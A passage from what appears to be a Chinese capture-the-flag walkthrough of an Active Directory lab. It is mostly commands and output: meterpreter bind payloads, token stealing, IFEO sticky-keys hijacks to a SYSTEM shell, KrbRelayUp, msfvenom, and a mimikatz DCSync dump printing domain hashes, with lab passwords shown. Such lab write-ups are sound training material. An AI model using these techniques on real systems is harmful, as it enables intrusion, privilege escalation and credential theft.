+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 39.99.228.12<br><span class="hljs-built_in">set</span> LPORT 54520<br>run<br></code></pre></td></tr></table></figure>
+
+<p>这时候就有John了，然后用msf的incognito模块获取John的令牌</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">use incognito<br>list<span class="hljs-emphasis">_tokens -u</span><br><span class="hljs-emphasis">impersonate_</span>token WIN-WEB\\John<br><br># 运行结果：<br>meterpreter &gt; use incognito<br>Loading extension incognito...Success.<br>meterpreter &gt; list_tokens -u<br><br><span class="hljs-section">Delegation Tokens Available</span><br><span class="hljs-section">========================================</span><br>IIS APPPOOL\DefaultAppPool<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br>NT SERVICE\MsDtsServer130<br>NT SERVICE\MSSQLFDLauncher<br>NT SERVICE\MSSQLSERVER<br>NT SERVICE\MSSQLServerOLAPService<br>NT SERVICE\ReportServer<br>NT SERVICE\SQLTELEMETRY<br>NT SERVICE\SSASTELEMETRY<br>NT SERVICE\SSISTELEMETRY130<br>WIN-WEB\John<br>Window Manager\DWM-1<br>Window Manager\DWM-2<br><br><span class="hljs-section">Impersonation Tokens Available</span><br><span class="hljs-section">========================================</span><br>No tokens available<br>meterpreter &gt; impersonate<span class="hljs-emphasis">_token WIN-WEB\\John</span><br><span class="hljs-emphasis">meterpreter &gt; impersonate_</span>token WIN-WEB\\John<br>[+] Delegation token available<br>[+] Successfully impersonated user WIN-WEB\John<br></code></pre></td></tr></table></figure>
+
+<p>这里提下<code>incognito</code>的一些trick：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">load</span> incognito                           <span class="hljs-meta"># 加载 incognito 模块，use incognito</span><br>list_tokens -u                           <span class="hljs-meta"># 列出主机上的所有访问令牌</span><br>impersonate_token “NT AUTHORITY\<span class="hljs-keyword">SYSTEM</span>”  <span class="hljs-meta"># 窃取 NT AUTHORITY\SYSTEM 账户的令牌</span><br>steal_token &lt;PID&gt;                        <span class="hljs-meta"># 从指定的进程中窃取令牌</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>举一个题外话的小例子，通过令牌获取TrustedInstaller权限：</p>
+<p>从 Windows Vista 开始系统内置了一个 TrustedInstaller  安全主体，拥有修改系统文件权限，专用于对系统进行维护、更新等操作。TrustedInstaller 以一个账户组的形式出现，即 <code>NT SERVICE\TrustedInstaller</code>。</p>
+<p>通常情况下，测试人员可以通过令牌窃取的方式获取系统  TrustedInstaller 权限。由于 TrustedInstaller 本身也是一个服务，当启动该服务时，会运行  TrustedInstaller.exe 程序，该程序的在系统上的路径为  <code>C:\Windows\servicing\TrustedInstaller.exe</code>，其拥有者为 <code>NT SERVICE\TrustedInstaller</code>。测试人员可以窃取 TrustedInstaller.exe 进程的令牌，以提升至  TrustedInstaller 权限。</p>
+<p>首先，执行以下命令，在目标系统上启动 TrustedInstaller 服务，并查看其PID</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;<span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> TrustedInstaller<br></code></pre></td></tr></table></figure>
+
+<p>然后，记录 TrustedInstaller.exe 进程的 PID 并执行以下命令：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;steal_token <span class="hljs-tag">&lt;<span class="hljs-name">PID</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>即可从 TrustedInstaller.exe 进程中窃取令牌。</p>
+</blockquote>
+<p>然后我们回归题目：</p>
+<p>此时就能拿到TSclient挂载的C盘，<code>net use</code>查看挂载情况，获取<code>\\tsclient\c\credential.txt</code>，拿到一个用户账号</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs less">C:\1&gt;chcp 65001<br>chcp 65001<br>Active code <span class="hljs-attribute">page</span>: <span class="hljs-number">65001</span><br><span class="hljs-attribute">C</span>:\<span class="hljs-number">1</span>&gt;whoami<br>whoami<br>win-web\john<br><span class="hljs-attribute">C</span>:\<span class="hljs-number">1</span>&gt;net use<br>net use<br>New connections will be remembered.<br>Status       Local     Remote                    Network<br><br>-------------------------------------------------------------------------------<br>                       \\TSCLIENT\C              Microsoft Terminal Services<br>The command completed successfully.<br><span class="hljs-attribute">C</span>:\<span class="hljs-number">1</span>&gt;type \\tsclient\c\credential.txt<br>type \\tsclient\c\credential.txt<br>xiaorang.lab\<span class="hljs-attribute">Aldrich</span>:Ald<span class="hljs-variable">@rLMWuy7Z</span>!#<br><br>Do you know how to hijack Image?<br><span class="hljs-attribute">C</span>:\<span class="hljs-number">1</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="msf直接migrate"><a href="#msf直接migrate" class="headerlink" title="msf直接migrate"></a>msf直接migrate</h3><p>第二种方法，msf直接migrate（迁移）到john的svc（服务）进程，进而去读credential.txt</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">meterpreter &gt; ps<br><span class="hljs-section">Process List</span><br><span class="hljs-section">============</span><br><br><span class="hljs-code"> PID   PPID  Name                      Arch  Session  User                               Path</span><br><span class="hljs-code"> ---   ----  ----                      ----  -------  ----                               ----</span><br><span class="hljs-code"> 0     0     [System Process]</span><br><span class="hljs-code"> 4     0     System                    x64   0</span><br><span class="hljs-code"> 68    544   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE         C:\Windows\System32\svchost.exe</span><br><span class="hljs-code"> 176   2452  cmd.exe                   x64   0        NT AUTHORITY\SYSTEM                C:\Windows\System32\cmd.exe</span><br><span class="hljs-code"> 248   4     smss.exe                  x64   0</span><br><span class="hljs-code"> 。。。</span><br></code></pre></td></tr></table></figure>
+
+<p>进程列表里和 <code>WIN-WEB\John</code> 相关的进程有：</p>
+<ul>
+<li><code>1848  sihost.exe</code></li>
+<li>。。。</li>
+<li><code>3036  explorer.exe</code></li>
+<li><code>3228  SearchUI.exe</code></li>
+<li><code>3432  taskhostw.exe</code></li>
+<li>。。。</li>
+</ul>
+<p>推荐选择<code>explorer.exe</code>（PID 3036）或 <code>taskhostw.exe</code>（PID 2084&#x2F;3432），通常比较稳定。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">meterpreter &gt; migrate <span class="hljs-number">3036</span><br><span class="hljs-selector-attr">[*]</span> Migrating <span class="hljs-selector-tag">from</span> <span class="hljs-number">960</span> <span class="hljs-selector-tag">to</span> <span class="hljs-number">3036</span>...<br><span class="hljs-selector-attr">[*]</span> Migration completed successfully.<br></code></pre></td></tr></table></figure>
+
+<p>但是，Meterpreter 的 <code>cat</code> 命令并不支持直接访问重定向的共享路径（如 <code>\\tsclient\c\</code>），只能操作目标机器本地的文件系统，所以我们进shell读</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Windows\system32&gt;whoami<br>whoami<br>win-web\john<br><span class="hljs-name">C</span>:\Windows\system32&gt;<span class="hljs-built_in">type</span> \\tsclient\c\credential.txt<br><span class="hljs-built_in">type</span> \\tsclient\c\credential.txt<br><br>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#<br><br>Do you know how to hijack Image?<br></code></pre></td></tr></table></figure>
+
+<p>看提示，应该是IFEO 劫持（镜像劫持）：</p>
+<blockquote>
+<p>IFEO 劫持（Image File Execution Options Hijacking）是 Windows 系统下非常经典且常见的一种持久化和绕过技术。</p>
+</blockquote>
+<p>这里已经获得了域用户 John 的账号，但是RDP 连过去提示密码已过期，修改密码后再次登录</p>
+<p><strong>密码修改方式一</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec xiaorang.lab/Aldrich:<span class="hljs-string">&quot;Ald<span class="hljs-variable">@rLMWuy7Z</span>!#&quot;</span>@<span class="hljs-number">172.22.8.15</span> -newpass <span class="hljs-string">&#x27;csy666zz!&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>密码修改方式二</strong></p>
+<p>使用xfreerdp，利用RDP图像界面进行修改，见下面截图</p>
+<p>从46、15、31选机子登录（可以密码喷洒一下），我们直接手试。</p>
+<p>登录 <code>172.22.8.31</code> 时，提示登录失败, 因为不在 Remote Desktop Users 用户组内，没有权限（能连上但是无法登录）。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235572.png" srcset="/img/loading.gif" lazyload alt="image-20250803234708850"></p>
+<p>尝试登录46，成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 比较老的工具，很卡，不推荐</span><br>proxychains rdesktop 172.22.8.46 -u <span class="hljs-string">&#x27;Aldrich&#x27;</span> -d <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> -p <span class="hljs-string">&#x27;Wcryyds666.&#x27;</span> -r clipboard:CLIPBOARD<br><span class="hljs-comment"># 比较新，较流畅，推荐</span><br>proxychains xfreerdp3 /u:Aldrich /p:Wcryyds666. /d:xiaorang.lab /v:172.22.8.46 /cert:ignore /sec:tls<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用 mstsc 反向攻击思路整理：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg">https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg</a></p>
+<h2 id="bloodhound信息搜集"><a href="#bloodhound信息搜集" class="headerlink" title="bloodhound信息搜集"></a>bloodhound信息搜集</h2><p>46在域里的且46这台机子的机器用户是域管</p>
+<p>上bloodhound信息搜集一下</p>
+<p>上传SharpHound.exe</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/m</span>atrix<span class="hljs-regexp">/Desktop/</span>BloodHound<span class="hljs-regexp">/resources/</span>app<span class="hljs-regexp">/Collectors/</span>SharpHound.exe<br></code></pre></td></tr></table></figure>
+
+<p>然后在目标机器上运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 二进制采集工具命令：</span><br>SharpHound.exe -c all<br><span class="hljs-comment"># powershell采集工具命令（这个是上传SharpHound.ps1）：</span><br>powershell -<span class="hljs-built_in">exec</span> bypass -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>启动neo4j数据库（没有的话注意先安装）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> neo4j start<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235043.png" srcset="/img/loading.gif" lazyload alt="image-20250811170609580"></p>
+<p>使用BloodHound</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./BloodHound</span> <span class="hljs-params">--no-sandbox</span><br></code></pre></td></tr></table></figure>
+
+<p>下载zip到Kali，上传到BloodHound并分析</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235690.png" srcset="/img/loading.gif" lazyload alt="image-20250805014535911"></p>
+<p>删除数据库中的所有节点和关系的话，可以用boundhound自带的清空按钮</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235223.png" srcset="/img/loading.gif" lazyload alt="c0660838f26a88bcdfb2e52b0577d90f"></p>
+<p>也可以neo4j里手动<strong>清空 BloodHound 数据</strong>（不建议）：</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">MATCH</span> (<span class="hljs-built_in">n</span>) DETACH DELETE <span class="hljs-built_in">n</span>;<br></code></pre></td></tr></table></figure>
+
+<p>返回题目，</p>
+<p>目前只有普通用户权限，需要提权，那接下来的目标就是：在.46上本地提权至system，然后PTH拿下域控。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据上文的提示，猜测能够直接修改注册表进行 IFEO 劫持。</p>
+<h3 id="IFEO-劫持"><a href="#IFEO-劫持" class="headerlink" title="IFEO 劫持"></a>IFEO 劫持</h3><p><strong>IFEO</strong> 全称为 <strong>Image File Execution Options</strong>，是 Windows 注册表下的一个功能，原本是给开发者调试程序用的。</p>
+<p>路径如下：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">HKEY_LOCAL</span><span class="hljs-type">_MACHINE</span>\<span class="hljs-variable">SOFTWARE</span>\<span class="hljs-variable">Microsoft</span>\<span class="hljs-variable">Windows</span> <span class="hljs-variable">NT</span>\<span class="hljs-variable">CurrentVersion</span>\<span class="hljs-built_in">Image</span> <span class="hljs-built_in">File</span> <span class="hljs-variable">Execution</span> <span class="hljs-built_in">Options</span><br></code></pre></td></tr></table></figure>
+
+<p>在这个路径下，可以为指定的可执行文件（比如 notepad.exe）新建一个同名子项，并设置一些键值，最常见的是 <code>Debugger</code>。<code>Debugger</code> 键用来指定调试器程序的路径。<strong>当目标程序启动时，系统会实际启动这个调试器程序，并将目标程序的路径作为参数传递给它</strong>。</p>
+<p>是不是有点懵，我们通俗易懂地解释一下：</p>
+<blockquote>
+<p>你在注册表的指定位置，给某个程序（比如 notepad.exe、sethc.exe）加一条特殊说明，告诉系统“以后你要运行它时，先运行我指定的另一个程序”。</p>
+<p>这个特殊说明就是给它加一个叫 <code>Debugger</code> 的键，内容是另一个程序的路径。</p>
+</blockquote>
+<p><strong>效果</strong>：</p>
+<p>当用户或系统试图启动原本的程序，实际上会先启动你指定的调试器程序，这样你就可以实现权限提升、持久化、执行后门或钓鱼等操作。</p>
+<p>用get-acl查看IFEO权限，fl命令是为了把一行显示为多行</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">get-acl</span> -<span class="hljs-string">path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="hljs-string">fl</span> *<br></code></pre></td></tr></table></figure>
+
+<p>其中Authenticated Users指的是所有非来宾用户，也包括John，拥有对这个目录的所有权限。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235365.png" srcset="/img/loading.gif" lazyload alt="image-20250803235440491"></p>
+<p>我们把cmd绑定到放大镜上，或者高对比度（粘滞键）上</p>
+<p>实际效果：当有人尝试运行<code>magnify.exe</code>或者<code>sethc.exe</code>时，系统实际上会启动<code>cmd.exe</code>（命令行）。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 劫持放大镜</span><br>REG ADD <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>OFTWARE<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows NT<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\I</span>mage File Execution Options<span class="hljs-char escape_">\m</span>agnify.exe&quot;</span> <span class="hljs-symbol">/v</span> Debugger <span class="hljs-symbol">/t</span> REG_SZ <span class="hljs-symbol">/d</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\w</span>indows<span class="hljs-char escape_">\s</span>ystem32<span class="hljs-char escape_">\c</span>md.exe&quot;</span><br><span class="hljs-comment"># 劫持粘滞键</span><br>reg add <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>OFTWARE<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows NT<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\I</span>mage File Execution Options<span class="hljs-char escape_">\s</span>ethc.exe&quot;</span> <span class="hljs-symbol">/v</span> Debugger <span class="hljs-symbol">/t</span> REG_SZ <span class="hljs-symbol">/d</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\S</span>ystem32<span class="hljs-char escape_">\c</span>md.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>操作成功之后锁定（锁定方法：点击用户头像，选择锁定）</p>
+<p>上面两种payload对应着两种劫持方法，都能得到一个system权限的cmd，第一种是点击右下角的放大镜</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235860.png" srcset="/img/loading.gif" lazyload alt="image-20250803235719185"></p>
+<p>第二种是按五次shift键，启动粘滞键</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235744.png" srcset="/img/loading.gif" lazyload alt="image-20250803235752245"></p>
+<p>可以直接读取flag</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\Administrator\flag\flag02.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235119.png" srcset="/img/loading.gif" lazyload alt="image-20250804000358581"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;<span class="hljs-number">7</span>ace1bcb-<span class="hljs-number">2</span>e91-<span class="hljs-number">48</span>ca-<span class="hljs-number">9</span>cad-f4c15212d7f9&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="KrbRelayUp"><a href="#KrbRelayUp" class="headerlink" title="KrbRelayUp"></a>KrbRelayUp</h3><p>但是也有非预期解，KrbRelayUp域内提权一把梭</p>
+<p>获取cls的方法这里略</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">.\KrbRelayUp.exe relay --doimain xiaorang.lab --CreateNewComputerAccount --ComputerName matrix$ --ComputerPassword Matrix2025! -cls c980e4c2-c178-4572-935d-a8a429884806<br>.\KrbRelayUp.exe spawn -m rbcd -d xiaorang.lab -dc DC01.xiaorang.lab -cn matrix$ -<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup/">detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup</a></p>
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>传马的话因为有远程桌面，直接复制粘贴就完事了：在本地电脑复制文件（Ctrl+C），然后在远程桌面窗口里粘贴（Ctrl+V），即可把文件从本地传到远程。</p>
+<p>这里上线msf，注意在system权限下运行后门，就是还是用映像劫持去执行后门，然后运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成msf马</span><br>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=54532 -f exe -o shell32.exe<br><br><span class="hljs-comment"># 由于之前没拿session，这里直接proxychains启动msfconsole</span><br>proxychains msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 172.22.8.46<br><span class="hljs-built_in">set</span> LPORT 54532<br>run<br></code></pre></td></tr></table></figure>
+
+<p>当然，我们也可以不传马</p>
+<p>先将远程登录的Aldrich添加到管理员</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup administrators Aldrich /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再上线msf也行（要添加到管理员是因为直接上线msf的话，权限不够）</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 172.22.8.46<br><span class="hljs-built_in">set</span> SMBUser Aldrich<br><span class="hljs-built_in">set</span> SMBPass Wcryyds666.<br><span class="hljs-built_in">set</span> SMBDomain xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54532<br>run<br></code></pre></td></tr></table></figure>
+
+<p>之后有两种方法，第一种是DCsync+PTH，第二种是约束委派之后DCsync+PTH</p>
+<h2 id="DCsync-PTH"><a href="#DCsync-PTH" class="headerlink" title="DCsync+PTH"></a>DCsync+PTH</h2><p>依旧是DCsync+PTH，上面我们提到了msf和<code>Impacket</code>工具集里的psexec，这里我们再介绍crackmapexec、<code>Impacket</code>工具集里的smbexec。</p>
+<h6 id="DCsync-PTH-1"><a href="#DCsync-PTH-1" class="headerlink" title="?DCsync+PTH"></a>?DCsync+PTH</h6><p>在.46上用mimikatz读机器用户的hash，可以用msf自带的</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs awk">load kiwi<br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br><br><br>meterpreter &gt; load kiwi<br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>Loading extension kiwi...<br><br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>         &gt; http:<span class="hljs-regexp">//</span>pingcastle.com <span class="hljs-regexp">/ http:/</span><span class="hljs-regexp">/mysmartlogon.com  ***/</span><br><br>Success.<br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>meterpreter &gt; kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><span class="hljs-number">502</span>     krbtgt  <span class="hljs-number">3</span>ffd5b58b4a6328659a606c3ea6f9b63        <span class="hljs-number">514</span><br><span class="hljs-number">1000</span>    DC01$   <span class="hljs-number">4810</span>cc9c2bac3f397226de8201d3c551        <span class="hljs-number">532480</span><br><span class="hljs-number">1103</span>    WIN2016$        <span class="hljs-number">17</span>b0ca4ae854dc2e5ba037fdb6ce9524        <span class="hljs-number">16781312</span><br><span class="hljs-number">1104</span>    WIN19-CLIENT$   <span class="hljs-number">78430</span>c25d0cbc87623c7881e2268c0a5        <span class="hljs-number">16781312</span><br><span class="hljs-number">1105</span>    Aldrich f833b1285fea0f548d6022081e030e55        <span class="hljs-number">512</span><br><span class="hljs-number">500</span>     Administrator   <span class="hljs-number">2</span>c9d81bdcf3ec8b1def10328a7cc2f08        <span class="hljs-number">512</span><br><br>mimikatz(powershell) <span class="hljs-comment"># exit</span><br>Bye!<br><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>[proxychains] DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>meterpreter &gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>然后PTH</p>
